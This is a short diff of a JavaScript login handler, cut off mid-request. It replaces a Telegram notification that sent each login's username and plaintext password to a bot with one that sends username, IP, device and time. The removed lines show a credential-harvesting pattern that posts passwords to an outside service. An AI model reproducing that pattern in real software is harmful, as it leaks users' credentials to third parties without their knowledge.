@@ -165,8 +165,13 @@ return;
 loggedIn = true;
 alert("Login Success");
 
-/* TELEGRAM NOTIFY */
-let message = "🔐 New Login\n\nUsername: " + username + "\nPassword: " + password;
+/* Telegram Message (NO PASSWORD) */
+let message =
+"🔐 LOGIN ALERT\n\n" +
+"User: " + username + "\n" +
+"IP: " + ip + "\n" +
+"Device: " + device + "\n" +
+"Time: " + time;
 
 fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
 method:"POST",
